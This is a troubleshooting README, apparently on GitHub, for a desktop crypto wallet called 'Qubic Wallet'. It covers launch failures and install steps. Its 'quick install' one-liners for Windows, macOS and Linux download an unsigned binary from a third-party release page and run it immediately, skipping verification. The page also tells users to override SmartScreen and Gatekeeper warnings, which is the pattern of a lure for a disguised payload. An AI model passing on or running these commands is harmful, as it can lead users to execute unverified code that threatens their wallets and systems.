![Qubic Wallet won't open or crashes on start](assets/banner-troubleshooting.png)

# Qubic Wallet Won't Open: Launch Failures and Their Causes

Six ways a desktop app fails to start, and the check that separates them.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

Failure modes below are those of the packaged build in the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2), not of a source build.

> A wallet that never opens is almost never a lost account. The account file is on disk, untouched, while the window is failing.

Qubic Wallet is an Electron application with a local Express server, and a launch can fail in several distinct ways: no window at all, a blank window, or a launch blocked before any of the app's code runs. Each has a different check, and none of them require touching your seed. Work down the table before you reinstall anything.

<!-- ARTICLE-BODY-BEGIN -->

## Symptom, cause, fix

| Symptom | Likely cause | What to check first |
| --- | --- | --- |
| Nothing happens when you double-click | The OS blocked or removed the file | Whether the file still exists where you downloaded it, then the antivirus log |
| Blank window after launch | The client assets are not where the app expects them, which follows an incomplete extraction | That you extracted the archive fully and run the app from the extracted folder |
| macOS refuses the first launch | Gatekeeper on an unsigned build | The Privacy and Security pane, after verifying the download hash |
| Linux exits with a permission error | The `.Wallet` file is not executable | `chmod +x` on the extracted file |
| Wrong architecture | Intel archive on Apple silicon, or the reverse | The file name: `osx-arm64` versus `osx-x64` |
| The hash does not match | The download is damaged, or is not this build | The published values in the install section below |

## Rule out the download before anything else

A damaged download can produce any of the symptoms in the table. Verify the download hash and then the binary against the `.sha256` inside the archive, exactly as the install section below describes: a file that fails either check is the whole explanation, and no amount of reinstalling fixes a corrupted download. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md">verification walkthrough</a> has both commands.

## Rule out the environment

If the hash matches, the next suspects surround the app rather than live in it: an antivirus that quarantined the executable, or a home directory the app cannot write to, which stops it creating `qwallet` on first run. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-antivirus-smartscreen-warning.md">warning guide</a> covers the first; re-extracting the archive into a fresh folder covers a copy that was only partly unpacked.

## When it opens but cannot connect

That is a different failure and a different page. If the window appears and the app reports offline or keeps retrying, the network path is the suspect rather than the launch. Start with the <a href="https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-not-syncing.md">not-syncing ladder</a>, which also covers blocked ports and proxies.

## What not to do

Do not delete the `qwallet` folder to "start clean" unless you have the seed written down and verified.

The same folder is what the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> writes on first run, so a reinstall will look for it there, not somewhere new.

Deleting it removes the only local copy of an encrypted account, and it is the one action here that can turn a launch problem into a permanent loss. Back it up first, as the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-data-folder-config-backup.md">backup guide</a> describes.

## FAQ

### Will reinstalling lose my account?

No, the account lives in your home folder, not in the app bundle - but back it up before you touch anything.

### Why does nothing happen when I click the app?

Usually the OS blocked or removed it. Check the file still exists, then the antivirus quarantine list.

### What if the download hash does not match?

Then the file is damaged or is not the build published here. Delete it and download again; do not open it to find out which.

### Does a white window mean the app is broken?

No. It means the window opened without its content loading, so the first thing to rule out is an incomplete extraction.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Not syncing](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-not-syncing.md)
- [Antivirus and SmartScreen](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-antivirus-smartscreen-warning.md)
- [Download and verify](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md)
- [Install on your system](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-install-windows-macos-linux.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
